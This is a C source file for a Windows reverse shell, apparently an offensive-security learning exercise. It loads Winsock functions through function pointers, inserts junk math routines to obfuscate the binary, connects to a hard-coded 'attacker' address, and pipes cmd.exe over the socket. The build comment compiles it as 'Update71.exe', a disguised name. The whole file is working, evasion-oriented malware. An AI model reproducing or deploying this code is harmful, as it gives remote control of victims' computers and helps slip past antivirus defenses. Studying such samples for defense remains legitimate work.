/*
    Obfuscated Reverse Shell w/ Function Ptrs
    15 Mar 2025
    Eric

    To build: i686-w64-mingw32-g++ 07_obfusc_func_ptr.c -o Update71.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
*/

#include <winsock2.h>           // Sockets https://learn.microsoft.com/en-us/windows/win32/api/winsock2/
#include <stdio.h>              // C standard input/output
#include <math.h>
#pragma comment(lib, "w2_32")   // tells linker to use ws2_32.lib 


//variables
WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;                //https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
PROCESS_INFORMATION processInfo;

typedef int (WSAAPI *WSAStartup_t)(WORD, LPWSADATA);
typedef SOCKET (WSAAPI *WSASocket_t)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
typedef int (WSAAPI *WSAConnect_t)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);


int generate_key(int number) {
    volatile int x = number;
    x += 1;
    x -= 1;
    x *= 2;
    x /= 2;
  
    // Additional complex math operations
    double y = 2.5;
    double z = 3.7;
    double result = 0.0;
  
    // Perform math operations
    result = sqrt(pow(y, 2) + pow(z, 2)); // Calculate square root of sum of squares
    result = sin(result); // Calculate sine of the result
    result = cos(result); // Calculate cosine of the result
    result = tan(result); // Calculate tangent of the result
  
    // Use the result to perform more operations
    for (int i = 0; i < 10; ++i) {
      result *= i;
      result /= (i + 1);
      result += i;
    }
  
    // Use the final result to perform some conditional operations
    if (result > 100) {
      result -= 100;
    } else {
      result += 100;
    }

    return result;
  }

int wow(){
  int number = 8888;
  int number2 = 6666;
  int number3 = 9999;

  number = number * 2;
  number = number / 4;

  number3 = number3 / 3;

  number2 = number * number3;
  number3 = number2 - number;

  return number;
}

int main(int argc, char* argv[]){
    volatile int x = generate_key(0);

    // attacker connection info
    char *attackerIP = "10.0.3.4";
    short attackerPort = wow();

    HMODULE hWS2_32 = LoadLibrary("ws2_32.dll");

    WSAStartup_t st = (WSAStartup_t)GetProcAddress(hWS2_32, "WSAStartup");
    WSASocket_t  so = (WSASocket_t)GetProcAddress(hWS2_32, "WSASocketA");
    WSAConnect_t co = (WSAConnect_t)GetProcAddress(hWS2_32, "WSAConnect");


    // init socket library, version 2.2
    st(MAKEWORD(2,2), &socketData);

    // create TCP IPv4 socket
    // https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketw
    // book uses (unsigned int)NULL instead of 0 for group and flags, which I have no idea why
    mainSocket = so(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    x = generate_key(1);

    // build IPv4 IP:PORT connection struct
    connectionAddress.sin_family = AF_INET;
    connectionAddress.sin_port = htons(attackerPort);
    connectionAddress.sin_addr.s_addr = inet_addr(attackerIP);

    // connect
    co(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

    x = generate_key(2);

    // process info
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfow
    memset(&startupInfo,0, sizeof(startupInfo));    // load empty struct into memory
    startupInfo.cb = sizeof(startupInfo);           // struct size
    startupInfo.dwFlags = STARTF_USESTDHANDLES;      // additional info to in, out, err handles
    // most important line, this sets the input, output and error streams to go through the socket
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

    x = generate_key(3);

    // spawn cmd shell, sending streams over socket
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
    
    x = generate_key(2);
    
    exit(0);
}